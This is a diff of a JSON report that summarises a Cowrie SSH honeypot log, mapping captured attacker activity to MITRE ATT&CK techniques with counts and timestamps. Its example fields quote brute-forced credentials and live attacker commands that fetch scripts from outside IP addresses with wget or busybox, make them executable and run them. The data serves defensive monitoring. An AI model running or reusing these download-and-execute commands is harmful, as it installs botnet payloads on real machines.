@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-02 19:00:45",
+  "generated": "2026-09-02 20:04:11",
   "totals": {
-    "commands": 569,
-    "login_failed": 1781,
-    "login_success": 149,
-    "sessions": 1994
+    "commands": 662,
+    "login_failed": 1845,
+    "login_success": 156,
+    "sessions": 2075
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1781,
+      "count": 1845,
       "examples": [
         "admin / admin",
         "admin / ruijie@123",
@@ -21,30 +21,14 @@
         "root / Info@123"
       ],
       "first": "2026-09-02T00:00:49.263609Z",
-      "last": "2026-09-02T19:00:27.214583Z",
-      "unique_ips": 234
-    },
-    {
-      "id": "T1078",
-      "name": "Valid Accounts",
-      "tactic": "Initial Access",
-      "count": 149,
-      "examples": [
-        "admin / vertex25ektks123",
-        "ubnt / password321",
-        "root / ms3456",
-        "ubuntu / ubuntu",
-        "root / root"
-      ],
-      "first": "2026-09-02T00:18:42.984434Z",
-      "last": "2026-09-02T19:00:31.358458Z",
-      "unique_ips": 129
+      "last": "2026-09-02T20:01:45.441220Z",
+      "unique_ips": 246
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 138,
+      "count": 183,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +37,30 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-02T00:49:42.143671Z",
-      "last": "2026-09-02T18:16:34.390718Z",
-      "unique_ips": 14
+      "last": "2026-09-02T19:45:31.461400Z",
+      "unique_ips": 17
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "count": 156,
+      "examples": [
+        "admin / vertex25ektks123",
+        "ubnt / password321",
+        "root / ms3456",
+        "ubuntu / ubuntu",
+        "root / root"
+      ],
+      "first": "2026-09-02T00:18:42.984434Z",
+      "last": "2026-09-02T19:59:57.266560Z",
+      "unique_ips": 135
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 62,
+      "count": 74,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,8 +69,8 @@
         "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht"
       ],
       "first": "2026-09-02T00:49:43.799681Z",
-      "last": "2026-09-02T18:16:34.390718Z",
-      "unique_ips": 14
+      "last": "2026-09-02T19:45:31.461400Z",
+      "unique_ips": 17
     },
     {
       "id": "T1082",
@@ -92,15 +92,15 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 12,
+      "count": 15,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "id",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-02T00:49:43.799681Z",
-      "last": "2026-09-02T18:15:58.450794Z",
-      "unique_ips": 12
+      "last": "2026-09-02T19:44:55.357532Z",
+      "unique_ips": 15
     },
     {
       "id": "T1059.004",
@@ -154,47 +154,51 @@
   "unmapped": [
     [
       "/bin/busybox",
-      176
+      183
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      56
+      72
     ],
     [
       "system",
-      28
+      31
     ],
     [
       "shell",
-      27
+      30
     ],
     [
       "sh",
-      27
+      30
+    ],
+    [
+      "enable",
+      14
     ],
     [
       "/bin/busybox UNSTABLE",
       14
     ],
     [
-      "enable",
-      11
-    ],
-    [
       "linuxshell",
-      9
+      12
     ],
     [
       "ping ;sh",
-      9
+      12
     ],
     [
       "cd /proc && cat self/cmdline",
-      9
+      12
     ],
     [
       "enablelinuxshell",
-      8
+      11
+    ],
+    [
+      "busybox",
+      2
     ],
     [
       "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
@@ -226,10 +230,6 @@
     ],
     [
       "Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=",
-      2
-    ],
-    [
-      "-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no",
       2
     ]
   ]
